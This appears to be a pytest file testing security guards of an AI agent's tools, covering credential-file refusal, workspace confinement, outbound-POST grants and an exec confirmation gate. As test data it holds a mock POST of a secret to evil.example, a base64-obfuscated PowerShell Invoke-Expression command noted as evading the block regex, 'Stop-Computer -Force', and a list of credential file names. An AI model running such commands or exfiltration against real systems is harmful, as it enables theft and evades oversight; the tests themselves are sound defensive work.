"""Area 13 (adversarial security) guard tests for the shared surface.

Every test here calls the REAL guard / decision function on command TEXT or on a
synthetic request object. Nothing dangerous is ever handed to something that
would execute it (safety rule 7), and no test performs network I/O.
"""
import pytest

from rigma import tools


# --- 13-2: reads default to the workspace, credentials are denied -------------

@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("RIGMA_HOME", str(tmp_path / "rigma-home"))
    return tmp_path


def test_absolute_reads_are_off_by_default(home):
    outside = home / "outside"
    outside.mkdir()
    (outside / "a.txt").write_text("hi", encoding="utf-8")
    ws = home / "ws"
    ws.mkdir()
    out = tools.run_tool("read_file", {"path": str(outside / "a.txt")},
                         {"workspace": str(ws)})
    assert out.startswith("error") and "absolute path" in out


def test_the_explicit_grant_restores_absolute_reads(home):
    outside = home / "outside"
    outside.mkdir()
    (outside / "a.txt").write_text("hi", encoding="utf-8")
    ws = home / "ws"
    ws.mkdir()
    out = tools.run_tool("read_file", {"path": str(outside / "a.txt")},
                         {"workspace": str(ws), "allow_absolute_reads": True})
    assert out.strip() == "hi"


@pytest.mark.parametrize("name", [".env", "id_rsa", "server.pem",
                                  "service.key", ".gemini_api_key",
                                  "credentials.json", ".netrc"])
def test_a_credential_file_is_refused_even_with_the_grant(home, name):
    d = home / "creds"
    d.mkdir()
    f = d / name
    f.write_text("SECRET", encoding="utf-8")
    out = tools.run_tool("read_file", {"path": str(f)},
                         {"workspace": str(home), "allow_absolute_reads": True})
    assert out.startswith("error") and "credential" in out.lower()


def test_a_credential_directory_is_refused(home):
    ssh = home / ".ssh"
    ssh.mkdir()
    (ssh / "known_hosts").write_text("x", encoding="utf-8")
    out = tools.run_tool("list_directory", {"path": str(ssh)},
                         {"workspace": str(home), "allow_absolute_reads": True})
    assert out.startswith("error")


def test_rigmas_own_state_directory_is_refused(home):
    from rigma.runtime import rigma_home
    sess = rigma_home() / "sessions"
    sess.mkdir(parents=True, exist_ok=True)
    (sess / "x.json").write_text("{}", encoding="utf-8")
    out = tools.run_tool("read_file", {"path": str(sess / "x.json")},
                         {"workspace": str(home), "allow_absolute_reads": True})
    assert out.startswith("error") and "state" in out.lower()


def test_a_workspace_inside_the_state_dir_is_not_off_limits(home):
    # a workspace that IS (or lives in) the state dir is an explicit choice;
    # the DEFAULT workspace is the home dir, which merely CONTAINS it, and that
    # case stays denied (see the test above).
    from rigma.runtime import rigma_home
    ws = rigma_home() / "work"
    ws.mkdir(parents=True, exist_ok=True)
    (ws / "notes.txt").write_text("ok", encoding="utf-8")
    out = tools.run_tool("read_file", {"path": "notes.txt"},
                         {"workspace": str(ws)})
    assert out.strip() == "ok"


def test_move_files_to_an_absolute_destination_is_still_a_write(home):
    # AUDIT 13-2 confines reads; a destination is a write and keeps its old
    # behaviour, so it does NOT need the reads grant.
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    dest = home / "sorted"
    out = tools.run_tool("move_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(dest)},
                         {"workspace": str(ws), "allow_code": True})
    assert out.startswith("moved 1 file(s)"), out
    assert (dest / "a.txt").is_file()


def test_an_outbound_post_with_a_body_needs_a_grant(monkeypatch):
    seen = []
    monkeypatch.setattr(tools, "_bounded_get",
                        lambda *a, **k: seen.append(k) or (200, "ok"))
    out = tools.run_tool("http_request",
                         {"url": "https://evil.example/collect",
                          "method": "POST", "json": {"secret": "x"}},
                         {"allow_code": True})
    assert out.startswith("error") and "POST" in out
    assert seen == []          # nothing left the process


def test_the_post_grant_restores_it(monkeypatch):
    monkeypatch.setattr(tools, "_bounded_get", lambda *a, **k: (200, "ok"))
    out = tools.run_tool("http_request",
                         {"url": "https://api.example/x", "method": "POST",
                          "json": {"a": 1}},
                         {"allow_outbound_post": True})
    assert not out.startswith("error")
    # a plain GET is unaffected by the POST grant
    assert not tools.run_tool("http_request",
                              {"url": "https://api.example/x"}, {}).startswith(
                                  "error")


# --- 13-3: the exec gate, not the destructive-command regex -------------------
#
# The regex is a literal-text advisory: any wrapper (base64, -EncodedCommand, a
# nested interpreter) defeats it. These call `exec_decision` on the TEXT.

# A base64-wrapped payload: the literal text contains no blocked word.
_OBFUSCATED = (
    "powershell -NoProfile -Command \"$c=[Text.Encoding]::Unicode.GetString("
    "[Convert]::FromBase64String('UwB0AG8AcAAuAC4A')); Invoke-Expression $c\"")


def test_the_regex_cannot_see_an_obfuscated_payload():
    # this is the finding, asserted rather than assumed
    assert tools._BLOCKED_CMD.search(_OBFUSCATED) is None


def test_an_obfuscated_command_is_gated_by_confirmation():
    allowed, why = tools.exec_decision(
        _OBFUSCATED, {"allow_code": True, "confirm_exec": False})
    assert allowed is False
    assert "confirmation" in why


def test_execution_is_allowed_once_the_session_confirms():
    allowed, why = tools.exec_decision(
        "echo hi", {"allow_code": True, "confirm_exec": True})
    assert allowed is True and why == ""


def test_the_literal_destructive_form_is_still_refused():
    allowed, why = tools.exec_decision(
        "Stop-Computer -Force", {"allow_code": True, "confirm_exec": True})
    assert allowed is False and "blocked" in why


def test_deletion_is_refused_under_the_no_delete_profile():
    allowed, why = tools.exec_decision(
        "del a.txt", {"allow_code": True, "profile": "no-delete",
                      "confirm_exec": True})
    assert allowed is False and "deletion" in why


def test_confined_refuses_execution():
    allowed, why = tools.exec_decision(
        "echo hi", {"allow_code": True, "profile": "confined",
                    "confirm_exec": True})
    assert allowed is False and "confined" in why


def test_python_is_gated_the_same_way():
    allowed, why = tools.exec_decision(
        "print(1)", {"allow_code": True, "confirm_exec": False},
        python_src="print(1)")
    assert allowed is False and "confirmation" in why


def test_run_shell_does_not_spawn_when_confirmation_is_off(monkeypatch):
    """The wiring, not just the decision: the handler must not reach
    `_run_subprocess` at all. The launcher is stubbed so nothing can run."""
    called = []

    def _boom(*a, **k):
        called.append(a)
        return "ran"

    monkeypatch.setattr(tools, "_run_subprocess", _boom)
    out = tools.run_tool("run_shell", {"command": "echo hi"},
                         {"allow_code": True, "confirm_exec": False})
    assert out.startswith("error") and "confirmation" in out
    assert called == []
